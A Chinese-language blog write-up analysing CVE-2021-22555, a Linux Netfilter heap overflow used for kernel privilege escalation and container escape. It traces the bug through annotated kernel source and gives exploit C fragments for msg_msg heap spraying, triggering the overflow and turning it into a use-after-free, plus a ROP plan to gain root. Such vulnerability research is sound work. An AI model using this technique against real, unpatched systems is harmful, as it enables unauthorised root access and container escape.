---
layout: post
title: 【kernel exploit】CVE-2021-22555 2字节堆溢出写0漏洞提权分析
categories: [Kernel-exploit]
description: 【kernel exploit】CVE-2021-22555 2字节堆溢出写0漏洞提权分析
keywords: CVE, Kernel, Exploit
---

# 【kernel exploit】CVE-2021-22555 2字节堆溢出写0漏洞提权分析

文章首发于安全客：[CVE-2021-22555 2字节堆溢出写0漏洞提权分析](https://www.anquanke.com/post/id/254027)

**影响版本**：Linux v2.6.19-rc1~v5.12-rc7     v5.12-rc8已修补，漏洞存在了15年，评分7.8。 已修复的版本有 5.12，5.10.31, 5.4.113, 4.19.188, 4.14.231, 4.9.267, 4.4.267。 由syzkaller发现，参见[crash现场](https://github.com/google/security-research/security/advisories/GHSA-xxx5-8mvq-3528)。

**测试版本**：Linux-5.11.14  [exploit及测试环境下载地址](https://github.com/bsauce/kernel-exploit-factory)—https://github.com/bsauce/kernel-exploit-factory

**编译选项**：所有 `CONFIG_IP_NF_**` 和 `CONFIG_NETFILTER_**` 相关的选项。

```c
CONFIG_USER_NS=y
CONFIG_NET_NS=y
CONFIG_COMPAT=y
CONFIG_IP_NF_IPTABLES=y   		// /net/ipv4/netfilter/ip_tables.c
CONFIG_IP_NF_FILTER=y
CONFIG_IP_NF_MANGLE=y
CONFIG_IP_NF_NAT=y
CONFIG_IP_NF_RAW=y
CONFIG_IP_NF_SECURITY=y
CONFIG_IP_NF_**=y
    
CONFIG_NETFILTER_NETLINK=y
CONFIG_NETFILTER_XTABLES=y		// /net/netfilter/x_tables.c
CONFIG_NETFILTER_XT_MATCH_U32=y
CONFIG_NETFILTER_**=y
```

在编译时将`.config`中的`CONFIG_E1000`和`CONFIG_E1000E`，变更为=y。[参考](https://blog.csdn.net/qq_16097611/article/details/104965045)

```c
$ wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.11.14.tar.xz
$ tar -xvf linux-5.11.14.tar.xz
# KASAN: 设置 make menuconfig 设置"Kernel hacking" ->"Memory Debugging" -> "KASan: runtime memory debugger"。
$ make -j32
$ make all
$ make modules
# 编译出的bzImage目录：/arch/x86/boot/bzImage。
```

**漏洞描述**：`net/netfilter/x_tables.c` 中 `Netfilter` 模块的`ip_tables`子模块， 当调用`setsockopt()`和选项`IPT_SO_SET_REPLACE`（或 `IP6T_SO_SET_REPLACE`）时，内核结构需要从32位转换为64位，由于错误计算转换大小，导致在调用 [xt_compat_match_from_user()](https://elixir.bootlin.com/linux/v5.11.14/source/net/netfilter/x_tables.c#L731) 函数时**堆溢出写 0 **。攻击者可用于提权，或者从docker、k8s容器（[kubernetes](https://zhuanlan.zhihu.com/p/29232090)）中逃逸。需要`CAP_NET_ADMIN`权限，或者支持`user+network`命名空间。

**补丁**：[patch](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/net/netfilter/x_tables.c?id=b29c457a6511435960115c0f548c4360d5f4801d)    取消pad对齐，也可以禁用非特权用户执行`CLONE_NEWUSER`、`CLONE_NEWNET`，以缓解该漏洞：`echo 0 > /proc/sys/user/max_user_namespaces`。

```c

diff --git a/net/netfilter/x_tables.c b/net/netfilter/x_tables.c
index 6bd31a7a27fc5..92e9d4ebc5e8d 100644
--- a/net/netfilter/x_tables.c
+++ b/net/netfilter/x_tables.c
@@ -733,7 +733,7 @@ void xt_compat_match_from_user(struct xt_entry_match *m, void **dstptr,
 {
 	const struct xt_match *match = m->u.kernel.match;
 	struct compat_xt_entry_match *cm = (struct compat_xt_entry_match *)m;
-	int pad, off = xt_compat_match_offset(match);
+	int off = xt_compat_match_offset(match);
 	u_int16_t msize = cm->u.user.match_size;
 	char name[sizeof(m->u.user.name)];
 
@@ -743,9 +743,6 @@ void xt_compat_match_from_user(struct xt_entry_match *m, void **dstptr,
 		match->compat_from_user(m->data, cm->data);
 	else
 		memcpy(m->data, cm->data, msize - sizeof(*cm));
-	pad = XT_ALIGN(match->matchsize) - match->matchsize;
-	if (pad > 0)
-		memset(m->data + match->matchsize, 0, pad);
 
 	msize += off;
 	m->u.user.match_size = msize;
@@ -1116,7 +1113,7 @@ void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,
 {
 	const struct xt_target *target = t->u.kernel.target;
 	struct compat_xt_entry_target *ct = (struct compat_xt_entry_target *)t;
-	int pad, off = xt_compat_target_offset(target);
+	int off = xt_compat_target_offset(target);
 	u_int16_t tsize = ct->u.user.target_size;
 	char name[sizeof(t->u.user.name)];
 
@@ -1126,9 +1123,6 @@ void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,
 		target->compat_from_user(t->data, ct->data);
 	else
 		memcpy(t->data, ct->data, tsize - sizeof(*ct));
-	pad = XT_ALIGN(target->targetsize) - target->targetsize;
-	if (pad > 0)
-		memset(t->data + target->targetsize, 0, pad);
 
 	tsize += off;
 	t->u.user.target_size = tsize;
```

**保护机制**：开启KASLR/SMEP/SMAP。

**利用总结**：

- （1）构造4096个`msg_msg`主消息（0x1000）和辅助消息（0x400），利用2字节溢出写0来修改某个主消息的`msg_msg->m_list->next`低2字节，使得两个主消息指向同一个辅助消息，将**2字节溢出写0转化为UAF**。
- （2）注意，spray对象采用skb对象，victim对象采用`pipe()`管道中的`pipe_buf_operations`结构。首先利用skb改大`msg_msg->m_ts`，泄露相邻辅助消息的**`msg_msg->m_list->prev`**（主消息地址，也即0x1000堆块地址）；
- （3）再利用skb伪造`msg_msg->next`指向泄露的主消息地址，**泄露`msg_msg->m_list->next`**（辅助消息地址，也即0x400堆块地址）；
- （4）再利用skb伪造`msg_msg->m_list->next & prev`，以避免再次释放辅助消息时访问无效链表地址导致崩溃；
- （5）使`pipe_buffer`结构占据释放后的0x400空闲块，利用读skb**泄露其`ops`指针**，也即内核基址；
- （6）利用skb篡改`pipe_buffer->ops->release`指针，**劫持控制流**。
- （7）如果需要进行docker或k8s**容器逃逸**，则ROP链在执行`commit_creds(prepare_kernel_cred(0))`提权后，需执行`switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)`，以**替换exp进程的命名空间**。

---

## 1. Netfilter介绍

**简介**：Natfilter 是集成到linux内核协议栈中的一套防火墙系统。

**数据结构的关系**：

- （1）Netfilter 中有包含一些表（table)，不同的表用来存储不同功能的配置信息，默认有4种table，还可以另外创建。
- （2）每个table 里有多个chain，chain表示对报文的拦截处理点。例如网络层ipv4有5个拦截点，对应5个chain：报文路由前-`PREROUTING`，需三层转发的报文-FORWARD，本机生成的报文-OUTPUT，本机接收的报文-INPUT，路由后的报文-POSTROUTING。
- （3）每个chain 包含一些用户配置的rule，一条rule包含了一个或多个**匹配规则（match)**和一个**执行动作（target）**。如果报文符合匹配规则后，需要根据该执行动作（target）来处理报文。标准的匹配元素包含源/目的IP地址、接收/发送设备、传输层协议这五个元素，标准的执行动作包含ACCEPT、DROP、QUEUE、RETURN。

**四大功能（table）**：

- （1）对报文的过滤（对应filter表），包含3个chain—INPUT/OUTPUT/FORWARD。
- （2）对报文的修改（对应mangle表），包含以上5个chain。
- （3）对会话的连接跟踪（connection track)，包含2个chain，OUTPUT/PREROUTING。
- （4）网络地址转换（NAT)，包含3个chain，PREROUNGIN/OUTPUT/POSTROUTIN。

**`table->chain->rule`结构关系图示**：在内核空间，每个CPU上维护了一份rule的拷贝（有多少个CPU，就有多少个`entries`）。这样做是为了减少锁的使用及增加硬件L1 cache的命中次数，以空间换时间。

![table-chain-rule](/images/posts/CVE-2021-22555/table-chain-rule.jpg)

**`table->chain->rule`具体结构**：表用 [xt_table](https://elixir.bootlin.com/linux/v5.11.14/source/include/linux/netfilter/x_tables.h#L223) -> [xt_table_info](https://elixir.bootlin.com/linux/v5.11.14/source/include/linux/netfilter/x_tables.h#L248)结构表示；每条rule用[ipt_entry](https://elixir.bootlin.com/linux/v5.11.14/source/include/uapi/linux/netfilter_ipv4/ip_tables.h#L106)结构表示；match匹配规则用[xt_entry_match](https://elixir.bootlin.com/linux/v5.11.14/source/include/uapi/linux/netfilter/x_tables.h#L11)表示（用户空间和内核共享同一结构）；target执行动作用[xt_entry_target](https://elixir.bootlin.com/linux/v5.11.14/source/include/uapi/linux/netfilter/x_tables.h#L34)表示（用户空间和内核共享同一结构）。

```c
//（1）xt_table —— 表
struct xt_table {
	struct list_head list;

	/* What hooks you will enter on */
	unsigned int valid_hooks;
	struct xt_table_info *private;				// 指向真正存储rule的结构体

	/* Set this to THIS_MODULE if you are a module, otherwise NULL */
	struct module *me;
	u_int8_t af;													// 表所属的协议族
	int priority;		/* hook order */

	/* called when table is needed in the given netns */
	int (*table_init)(struct net *net);
	const char name[XT_TABLE_MAXNAMELEN];	// 表的名字，如filter/nat/mangle
};

struct xt_table_info {
	unsigned int size;													// 表中所有规则rule占用的内存大小
	unsigned int number;												// 表中存的rule个数
	unsigned int initial_entries;								// 初始化表时创建的默认rule个数
	unsigned int hook_entry[NF_INET_NUMHOOKS];	// 各个hook(chain)在表中的偏移量
	unsigned int underflow[NF_INET_NUMHOOKS];		// 各个hook(chain)中默认规则在表中的偏移量
	unsigned int stacksize;
	void ***jumpstack;
	unsigned char entries[] __aligned(8);				// 数组，存储各个cpu上自己rule拷贝的内存首地址
};
//（2）ipt_entry —— 规则rule
struct ipt_entry
{
	struct ipt_ip ip;														// 规则的基本匹配条件，源IP/目的IP、输入/输出网卡、协议
	unsigned int nfcache;
	u_int16_t target_offset;										// ipt_entry + matches 这条规则的target距离规则起点的偏移量
	u_int16_t next_offset;											// ipt_entry + matches + target 下一条规则距离这条规则起点的偏移量
	unsigned int comefrom;
	struct xt_counters counters;								// 计数器，每条规则都有计数器，一旦skb匹配这条规则，那么计数器累加，计数器有字节数和包数两个统计量
	unsigned char elems[0];											//这条规则中的match和target，因为不确定到底有几个match，所以使用零长度数组
};
//（3）xt_entry_match —— 匹配规则match，用户空间和内核空间共享match_size和data字段
#define ipt_entry_match xt_entry_match
struct xt_entry_match
{
	union {						// 用户态和内核态使用不同的结构表示match。它们的第一个成员都是match的总大小
		struct {										// a. 用户态
			u_int16_t match_size;      
			char name[XT_FUNCTION_MAXNAMELEN-1];	// 该match的版本,通过match的名称与版本信息可以唯一确定一个match。
			u_int8_t revision;
		} user;
		struct {										// b. 内核态
			u_int16_t match_size;
			struct xt_match *match;								// 指向扩展的match信息（每一个扩展match都是一个xt_match对象）。根据ipt_entry_match.u.user.name找到对应的match，将ipt_entry_match.u.kernel.match指针指向系统中已注册的struct xt_match对象
		} kernel;
		u_int16_t match_size;				// 整个match占用的内存空间
	} u;
	unsigned char data[0];
};
//（4）xt_entry_target —— 执行动作target，用户空间和内核空间共享match_size字段
#define ipt_entry_target xt_entry_target
struct xt_entry_target
{
	union {
		struct {										// a. 用户态
			u_int16_t target_size;
			char name[XT_FUNCTION_MAXNAMELEN-1];
			u_int8_t revision;
		} user;
		struct {										// b. 内核态
			u_int16_t target_size;
			struct xt_target *target;							// target信息，如果target->target()函数指针为NULL，那么是一个标准target，否则为扩展target。根据ipt_entry_target.u.user.name找到对应的target，将ipt_entry_target.u.kernel.target指针指向系统中已注册的struct xt_target对象
		} kernel;
		u_int16_t target_size;
	} u;
	unsigned char data[0];				// 对于扩展target，该指针指向内容会传给其target()回调，这个指针内容由扩展target自由使用，只要内核态和用户态保持一致就可以
};
```

**应用层与Netfilter的通信机制**：netfilter和用户空间进行通信使用的是两个socket的系统调用，`setsockopt()`和`getsockopt()`，把用户空间的地址传给内核，内核使用`copy_from_user()` 和 `copy_to_user()`来进行数据的传递。基于setsockopt和getsockopt系统调用的机制，Netfilter提供了一个基本框架，允许不同协议的防火墙来自己实现自己和用户空间的通信函数，涉及两个函数，调用`nf_register_sockopt()`将`nf_sockopt_ops`结构实例注册到netfilter管理的全局链表上，调用`nf_sockopt_find()`查找对应命令字的`nf_sockopt_ops`结构。

![setsockopt-getsockopt](/images/posts/CVE-2021-22555/setsockopt-getsockopt.jpg)

---

## 2. 漏洞分析

#### 2-1 漏洞原因

**漏洞**：[xt_compat_target_from_user()](https://elixir.bootlin.com/linux/v5.11.14/source/net/netfilter/x_tables.c#L1114)函数，将`xt_entry_match->data`指向的缓冲区进行8字节对齐，不足8字节的空间清0，但如果`target->targetsize`没有8字节对齐，这里会越界将pad个字节清0。`target->targetsize`并不由用户直接控制，可以通过选择不同的target结构体类型来控制`targetsize`大小。

```c
#ifdef CONFIG_COMPAT
int xt_compat_target_offset(const struct xt_target *target)
{
	u_int16_t csize = target->compatsize ? : target->targetsize;
	return XT_ALIGN(target->targetsize) - COMPAT_XT_ALIGN(csize);
}
EXPORT_SYMBOL_GPL(xt_compat_target_offset);

void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,
				unsigned int *size)
{
	const struct xt_target *target = t->u.kernel.target;
	struct compat_xt_entry_target *ct = (struct compat_xt_entry_target *)t;	// ct=t的副本
	int pad, off = xt_compat_target_offset(target);
	u_int16_t tsize = ct->u.user.target_size;
	char name[sizeof(t->u.user.name)];

	t = *dstptr;
	memcpy(t, ct, sizeof(*ct));		// ct 拷贝到 dstptr
	if (target->compat_from_user)
		target->compat_from_user(t->data, ct->data);
	else
		memcpy(t->data, ct->data, tsize - sizeof(*ct));
	pad = XT_ALIGN(target->targetsize) - target->targetsize;	// [1] 对缓冲区进行8字节对齐，target->targetsize 用来指定t->data实际使用长度
	if (pad > 0)
		memset(t->data + target->targetsize, 0, pad);			// [2] 将不足8字节的剩余空间清0，存在越界写0

	tsize += off;
	t->u.user.target_size = tsize;
	strlcpy(name, target->name, sizeof(name));
	module_put(target->me);
	strncpy(t->u.user.name, name, sizeof(t->u.user.name));

	*size += off;
	*dstptr += tsize;
}
EXPORT_SYMBOL_GPL(xt_compat_target_from_user);
```

#### 2-2 漏洞触发流程跟踪

**ip_tables模块初始化流程**：[ip_tables_init()](https://elixir.bootlin.com/linux/v5.11.14/source/net/ipv4/netfilter/ip_tables.c#L1899) -> [nf_register_sockopt()](https://elixir.bootlin.com/linux/v5.11.14/source/net/netfilter/nf_sockopt.c#L25) -> struct [nf_sockopt_ops](https://elixir.bootlin.com/linux/v5.11.14/source/include/linux/netfilter.h#L159)  [ipt_sockopts](https://elixir.bootlin.com/linux/v5.11.14/source/net/ipv4/netfilter/ip_tables.c#L1848)  注册`setsockopt`。这样用户调用`setsockopt`时，才能找到对应的处理函数，也即`do_ipt_set_ctl()`。

```c
static int __init ip_tables_init(void)
{
	int ret;
	ret = register_pernet_subsys(&ip_tables_net_ops);
	ret = xt_register_targets(ipt_builtin_tg, ARRAY_SIZE(ipt_builtin_tg));
	ret = xt_register_matches(ipt_builtin_mt, ARRAY_SIZE(ipt_builtin_mt));
	/* Register setsockopt */
	ret = nf_register_sockopt(&ipt_sockopts);				// <------------- nf_register_sockopt()
	[... ...]
	return ret;
}
static struct nf_sockopt_ops ipt_sockopts = {
	.pf		= PF_INET,
	.set_optmin	= IPT_BASE_CTL,
	.set_optmax	= IPT_SO_SET_MAX+1,
	.set		= do_ipt_set_ctl,							// <--------------- do_ipt_set_ctl()
	.get_optmin	= IPT_BASE_CTL,
	.get_optmax	= IPT_SO_GET_MAX+1,
	.get		= do_ipt_get_ctl,
	.owner		= THIS_MODULE,
};
```

**漏洞触发流程**：`setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, ...)` -> [nf_setsockopt()](https://elixir.bootlin.com/linux/v5.11.14/source/net/netfilter/nf_sockopt.c#L92) -> [do_ipt_set_ctl()](https://elixir.bootlin.com/linux/v5.11.14/source/net/ipv4/netfilter/ip_tables.c#L1621) -> [compat_do_replace()](https://elixir.bootlin.com/linux/v5.11.14/source/net/ipv4/netfilter/ip_tables.c#L1511) -> [translate_compat_table()](https://elixir.bootlin.com/linux/v5.11.14/source/net/ipv4/netfilter/ip_tables.c#L1440) -> [compat_copy_entry_from_user()](https://elixir.bootlin.com/linux/v5.11.14/source/net/ipv4/netfilter/ip_tables.c#L1376) ->  [xt_compat_match_from_user](https://elixir.bootlin.com/linux/v5.11.14/source/net/netfilter/x_tables.c#L731)  &  [xt_compat_target_from_user()](https://elixir.bootlin.com/linux/v5.11.14/source/net/netfilter/x_tables.c#L1114)

总之就是将用户传入的rule规则进行转换存储时，出现堆溢出写0。构造用户参数data，通过控制pad大小，控制溢出字节数。`data->ipt_replace->size = 0xFB6`，导致分配`sizeof(xt_table_info) + ipt_replace->size` = `0x40+0xfB6` = `0xff6`的堆块，转换用户传入规则时错误对齐，刚好溢出覆盖下一个0x1000堆块的前2 字节，造成指针的指向错误。

**用户参数**：综上，用户传入的参数结构为  [ipt_replace](https://elixir.bootlin.com/linux/v5.11.14/source/include/uapi/linux/netfilter_ipv4/ip_tables.h#L179) + [ipt_entry](https://elixir.bootlin.com/linux/v5.11.14/source/include/uapi/linux/netfilter_ipv4/ip_tables.h#L106) + [xt_entry_match](https://elixir.bootlin.com/linux/v5.11.14/source/include/uapi/linux/netfilter/x_tables.h#L11) + pad + [xt_entry_target](https://elixir.bootlin.com/linux/v5.11.14/source/include/uapi/linux/netfilter/x_tables.h#L34)。注意， [compat_ipt_replace](https://elixir.bootlin.com/linux/v5.11.14/source/net/ipv4/netfilter/ip_tables.c#L1203) 等同于 [ipt_replace](https://elixir.bootlin.com/linux/v5.11.14/source/include/uapi/linux/netfilter_ipv4/ip_tables.h#L179) 结构。

```c
// do_ipt_set_ctl()
static int do_ipt_set_ctl(struct sock *sk, int cmd, sockptr_t arg, unsigned int len)
{
	int ret;

	if (!ns_capable(sock_net(sk)->user_ns, CAP_NET_ADMIN))			// [1] 需满足 CAP_NET_ADMIN 权限，可以在启动脚本赋予exp权限，或者支持namespace就行
		return -EPERM;

	switch (cmd) {
	case IPT_SO_SET_REPLACE:
#ifdef CONFIG_COMPAT												// 编译内核时需设置 CONFIG_COMPAT
		if (in_compat_syscall())
			ret = compat_do_replace(sock_net(sk), arg, len);		// [2] <-----------------
		else
#endif
			ret = do_replace(sock_net(sk), arg, len);
	... ...
	return ret;
}
// [2] compat_do_replace() —— 分配 xt_table_info 结构, 拷贝用户参数
static int compat_do_replace(struct net *net, sockptr_t arg, unsigned int len)
{
	int ret;
	struct compat_ipt_replace tmp;
	struct xt_table_info *newinfo;
	void *loc_cpu_entry;
	struct ipt_entry *iter;

	if (copy_from_sockptr(&tmp, arg, sizeof(tmp)) != 0)				// [3] 获取size参数，用户参数开头是 compat_ipt_replace （内核）变长结构，等同于 ipt_replace （用户）结构
		return -EFAULT;

	/* overflow check */
	if (tmp.num_counters >= INT_MAX / sizeof(struct xt_counters))
		return -ENOMEM;
	if (tmp.num_counters == 0)
		return -EINVAL;

	tmp.name[sizeof(tmp.name)-1] = 0;

	newinfo = xt_alloc_table_info(tmp.size);						// [4] 分配空间 kvmalloc(sz, GFP_KERNEL_ACCOUNT);    分配大小 sz = sizeof(xt_table_info) + ipt_replace->size = 0x40 + (0xFB8 - 0x2) = 0xFF8 - 0x2  注意两点，一是分配采用 GFP_KERNEL_ACCOUNT 标志（与GFP_KERNEL相同，除了分配记入kmemcg），二是分配的堆块属于0x1000。  分配之后赋值 xt_table_info->size = ipt_replace->size = 0xFB6
	if (!newinfo)
		return -ENOMEM;

	loc_cpu_entry = newinfo->entries;
	if (copy_from_sockptr_offset(loc_cpu_entry, arg, sizeof(tmp),	// [5] 拷贝用户参数， 从偏移arg+sizeof(ipt_replace) 开始拷贝，跳过 ipt_replace 结构
			tmp.size) != 0) {
		ret = -EFAULT;
		goto free_newinfo;
	}

	ret = translate_compat_table(net, &newinfo, &loc_cpu_entry, &tmp); // [6] <--------------
	if (ret != 0)
		goto free_newinfo;

	ret = __do_replace(net, tmp.name, tmp.valid_hooks, newinfo,
			   tmp.num_counters, compat_ptr(tmp.counters));
	... ...
	return ret;
}
// [6] translate_compat_table() —— 分配新的 xt_table_info 结构，进行转换
static int translate_compat_table(struct net *net,
		       struct xt_table_info **pinfo,
		       void **pentry0,
		       const struct compat_ipt_replace *compatr)
{
	unsigned int i, j;
	struct xt_table_info *newinfo, *info;
	void *pos, *entry0, *entry1;
	struct compat_ipt_entry *iter0;
	struct ipt_replace repl;
	unsigned int size;
	int ret;

	info = *pinfo;
	entry0 = *pentry0;
	size = compatr->size;
	info->number = compatr->num_entries;		// 传入的是1
	... ...
	newinfo = xt_alloc_table_info(size);							// [7] 分配新的 xt_table_info 结构 —— newinfo, 转换后存入
	if (!newinfo)
		goto out_unlock;

	newinfo->number = compatr->num_entries;
	for (i = 0; i < NF_INET_NUMHOOKS; i++) {
		newinfo->hook_entry[i] = compatr->hook_entry[i];
		newinfo->underflow[i] = compatr->underflow[i];
	}
	entry1 = newinfo->entries;					// 
	pos = entry1;
	size = compatr->size;						// size = 0xFB8 - 0x2 = 0xfb6
	xt_entry_foreach(iter0, entry0, compatr->size)
		compat_copy_entry_from_user(iter0, &pos, &size,				// [8] <-------------- 转换entry结构，从32位到64位，传给 newinfo
					    newinfo, entry1);
	... ...
}
// [8] compat_copy_entry_from_user() —— 旧的 xt_table_info 拷贝到新的 xt_table_info 结构
static void compat_copy_entry_from_user(struct compat_ipt_entry *e, void **dstptr,
			    unsigned int *size,
			    struct xt_table_info *newinfo, unsigned char *base)
{
	struct xt_entry_target *t;
	struct ipt_entry *de;
	unsigned int origsize;
	int h;
	struct xt_entry_match *ematch;

	origsize = *size;
	de = *dstptr;
	memcpy(de, e, sizeof(struct ipt_entry));						// [9] 先拷贝 ipt_entry 结构
	memcpy(&de->counters, &e->counters, sizeof(e->counters));		//     包和字节计数

	*dstptr += sizeof(struct ipt_entry);
	*size += sizeof(struct ipt_entry) - sizeof(struct compat_ipt_entry);

	xt_ematch_foreach(ematch, e)
		xt_compat_match_from_user(ematch, dstptr, size);			// [10] 再拷贝 xt_entry_match 结构, off=4, pad=4, msize=u.user.match_size+off=0xf26+4=0xf2a（用户传入的）, match->matchsize=4, 拷贝完成后*dstptr+= msize = 0xffff888006e010b0+0xf2a = FFFF888006E01FDA, size+=off = 0xfba

	de->target_offset = e->target_offset - (origsize - *size);		// target_offset 原来是 ipt_entry + matches 结构的大小，现在减小了 4
	t = compat_ipt_get_target(e);
	xt_compat_target_from_user(t, dstptr, size);					// [11] <------------ 漏洞函数: 再拷贝 xt_entry_target 结构, 如下所示

	de->next_offset = e->next_offset - (origsize - *size);
	... ...
}
// [11] xt_compat_target_from_user() —— 拷贝 xt_entry_target 结构，对齐导致溢出
void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,
				unsigned int *size)
{
	const struct xt_target *target = t->u.kernel.target;
	struct compat_xt_entry_target *ct = (struct compat_xt_entry_target *)t;
	int pad, off = xt_compat_target_offset(target);			// off = target->targetsize = 4
	u_int16_t tsize = ct->u.user.target_size;				// tsize = 0x20
	char name[sizeof(t->u.user.name)];

	t = *dstptr;											// t = 0xffff888006e01fda
	memcpy(t, ct, sizeof(*ct));								// 拷贝0x20
	if (target->compat_from_user)
		target->compat_from_user(t->data, ct->data);
	else
		memcpy(t->data, ct->data, tsize - sizeof(*ct));
	pad = XT_ALIGN(target->targetsize) - target->targetsize;// pad = 4
	if (pad > 0)
		memset(t->data + target->targetsize, 0, pad);		// [12] t+0x20+4 处填充pad个0，也就是 0xffff888006e01ffe处填4个0，溢出2个字节, <------------------------- 溢出点

	tsize += off;											// tsize = 0x24
	t->u.user.target_size = tsize;							// 
	strlcpy(name, target->name, sizeof(name));
	module_put(target->me);
	strncpy(t->u.user.name, name, sizeof(t->u.user.name));

	*size += off;											// *size= 0xfba+4 = 0xfbe
	*dstptr += tsize;										// *dstptr = 0xffff888006e01ffe
}
EXPORT_SYMBOL_GPL(xt_compat_target_from_user);
```

**漏洞对象**：[xt_table_info](https://elixir.bootlin.com/linux/v5.11.14/source/include/linux/netfilter/x_tables.h#L248)  变长结构，`entries`为用户传入，每个`entries` 包含 [ipt_entry](https://elixir.bootlin.com/linux/v5.11.14/source/include/uapi/linux/netfilter_ipv4/ip_tables.h#L106) + [xt_entry_match](https://elixir.bootlin.com/linux/v5.11.14/source/include/uapi/linux/netfilter/x_tables.h#L11) + pad + [xt_entry_target](https://elixir.bootlin.com/linux/v5.11.14/source/include/uapi/linux/netfilter/x_tables.h#L34)，第一节中已经介绍过。

```c
struct xt_table_info {
	unsigned int size;			// entries 总大小, 不包括 xt_table_info 结构大小0x40
	unsigned int number;		// entries 数目
	unsigned int initial_entries;
	unsigned int hook_entry[NF_INET_NUMHOOKS];
	unsigned int underflow[NF_INET_NUMHOOKS];
	unsigned int stacksize;
	void ***jumpstack;

	unsigned char entries[] __aligned(8);	// 每个`entries` 包含 `ipt_entry` + `xt_entry_match` + pad + `xt_entry_target`
};
```

----

## 3. 漏洞利用

`msg_msg`结构的创建与读取，也即消息的发送与接收，可以参考文章 [Linux内核中利用msg_msg结构实现任意地址读写](https://www.anquanke.com/post/id/252558) 中对`msgsnd()`和`msgrcv()`源码的分析过程。

#### 3-1 漏洞转化：2字节溢出写0转化为UAF

##### （1）调用`msgget()`创建4096个消息队列

消息队列数目没有限制，但创建越多，exp越稳定

```c
  for (int i = 0; i < NUM_MSQIDS; i++) {
    if ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0) {
      perror("[-] msgget");
      goto err_no_rmid;
    }
  }
```

##### （2）主消息填充

**目的**：填充4096个主消息，消息大小为0x1000，以得到一个整齐的空间布局，使`msg_msg`结构体尽可能相邻。

```c
int write_msg(int msqid, const void *msgp, size_t msgsz, long msgtyp) {
  *(long *)msgp = msgtyp;
  if (msgsnd(msqid, msgp, msgsz - sizeof(long), 0) < 0) {
    perror("[-] msgsnd");
    return -1;
  }
  return 0;
}

  printf("[*] Spraying primary messages...\n");
  for (int i = 0; i < NUM_MSQIDS; i++) {
    memset(&msg_primary, 0, sizeof(msg_primary));
    *(int *)&msg_primary.mtext[0] = MSG_TAG;
    *(int *)&msg_primary.mtext[4] = i;
    if (write_msg(msqid[i], &msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) <
        0)
      goto err_rmid;
  }
```

`int msgsend(int msgid, const void *msg_ptr, size_t msg_sz, int msgflg)`

msgid——消息队列标识符；msg_ptr——指向结构体{mtype, mtext}；`msg_ptr.mtext[0]=MSG_TAG`—— 标识该内存区域为堆喷控制；`msg_ptr.mtext[4]=i`—— 标识该内存区id，以便识别内存区。

![1](/images/posts/CVE-2021-22555/1.png)

##### （3）辅助消息填充
为每个消息队列添加辅助消息，消息大小为0x400，消息标识与主消息对应。

```c
  printf("[*] Spraying secondary messages...\n");
  for (int i = 0; i < NUM_MSQIDS; i++) {
    memset(&msg_secondary, 0, sizeof(msg_secondary));
    *(int *)&msg_secondary.mtext[0] = MSG_TAG;
    *(int *)&msg_secondary.mtext[4] = i;
    if (write_msg(msqid[i], &msg_secondary, sizeof(msg_secondary),
                  MTYPE_SECONDARY) < 0)
      goto err_rmid;
  }
```

![2](/images/posts/CVE-2021-22555/2.png)

##### （4）释放部分主消息

**目的**：释放第1024、2048、3072个主消息，获得0x1000内存空洞，希望被`xt_table_info`结构获得，这样就能利用2字节溢出写0。

```c
int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, 0) < 0) {
    perror("[-] msgrcv");
    return -1;
  }
  return 0;
}

  printf("[*] Creating holes in primary messages...\n");
  for (int i = HOLE_STEP; i < NUM_MSQIDS; i += HOLE_STEP) {
    if (read_msg(msqid[i], &msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) <
        0)
      goto err_rmid;
  }
```

![3](/images/posts/CVE-2021-22555/3.png)

##### （5）触发漏洞

利用2字节溢出，将相邻的msg_msg结构体中`msg_msg->m_list->next`末尾两字节覆盖为0, 使得该主消息的`msg_msg->m_list->next`指向其他主消息的辅助消息。

**目的**：使某个内存被两个主消息引用。

```c
  printf("[*] Triggering out-of-bounds write...\n");
  if (trigger_oob_write(s) < 0)
    goto err_rmid;
```



![4](/images/posts/CVE-2021-22555/4.png)

##### （6）定位发生错误的消息队列索引

**方法**：直接查看消息内存，如果主消息和辅助消息队列的标识不同，则表示主消息`msg_msg->m_list->next`成员被修改。为保证查看消息时，避免消息被释放，需使用`MSG_COPY`标志接收消息。

```c
  printf("[*] Searching for corrupted primary message...\n");
  for (int i = 0; i < NUM_MSQIDS; i++) {
    if (i != 0 && (i % HOLE_STEP) == 0)
      continue;
    if (peek_msg(msqid[i], &msg_secondary, sizeof(msg_secondary), 1) < 0)
      goto err_no_rmid;
    if (*(int *)&msg_secondary.mtext[0] != MSG_TAG) {
      printf("[-] Error could not corrupt any primary message.\n");
      goto err_no_rmid;
    }
    if (*(int *)&msg_secondary.mtext[4] != i) {
      fake_idx = i;
      real_idx = *(int *)&msg_secondary.mtext[4];
      break;
    }
  }

  if (fake_idx == -1 && real_idx == -1) {
    printf("[-] Error could not corrupt any primary message.\n");
    goto err_no_rmid;
  }

  // fake_idx's primary message has a corrupted next pointer; wrongly
  // pointing to real_idx's secondary message.
  printf("[+] fake_idx: %x\n", fake_idx);
  printf("[+] real_idx: %x\n", real_idx);
```

##### （7）spray对象和victim对象占据msg_msg

使用包含函数指针的victim结构体和spray结构体（skb）来占据`msg_msg`。假设现在主消息1和主消息2的`msg_msg->m_list->next`指向同一辅助消息。

- 1.主消息1放弃辅助消息msg_msg, skb占据msg_msg

- 2.主消息2放弃辅助消息msg_msg, victim结构占据msg_msg

- 3.此时skb与victim结构占据同一内存空间

- 4.修改skb劫持victim结构内函数指针

- 5.触发victim结构函数指针，劫持控制流

